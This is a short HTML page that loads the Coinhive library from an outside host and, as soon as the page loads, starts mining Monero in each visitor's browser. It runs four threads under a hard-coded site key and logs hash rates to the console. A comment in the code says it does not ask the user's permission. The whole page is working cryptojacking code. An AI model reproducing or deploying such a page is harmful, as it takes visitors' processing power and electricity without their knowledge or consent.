<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>fuck you pay me</title>
  <meta name="description" content="mines monero">
  <meta name="author" content="crash springfield">
</head>

<body>
  <!-- script doesn't ask for user's permission -->
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>

  <script>
    const PUBLIC_KEY = 'WpMk1VMPiWJESZljHk6DoLgZbEqM8NMV'
    const logEvery = 10000    // miliseconds between each console.log
    const threads = 4         // the number of threads the miner should start with
    const autoThreads = false // experimental feature
    const throttle = 0.2      // 0 = full speed, 1 = idle
    const forceASMJS = false  // use faster WebAsembly hashing algorithm, if possible
    const options = {
    	threads,
    	autoThreads,
    	throttle,
    	forceASMJS,
    }
  	const miner = new CoinHive.Anonymous(PUBLIC_KEY, options)

    miner.start()
    miner.on('open', () => console.log('opened connection') )
    miner.on('authed', () => console.log('Token name is: ', miner.getToken()) )
    miner.on('found', () => console.log('found a hash') )
    miner.on('accepted', () => console.log('accepted hash was accepted') )
    miner.on('error', (res) => console.log((res.error == 'connection_error') ? 'connection error' : res.error) )

    setInterval(() => {
      let hashesPerSecond = miner.getHashesPerSecond()
      let totalHashes = miner.getTotalHashes()
      let acceptedHashes = miner.getAcceptedHashes()

      console.log('hashesPerSecond: ', hashesPerSecond)
      console.log('totalHashes: ', totalHashes)
      console.log('acceptedHashes: ', acceptedHashes)
    }, 10000)
  </script>
</body>
</html>
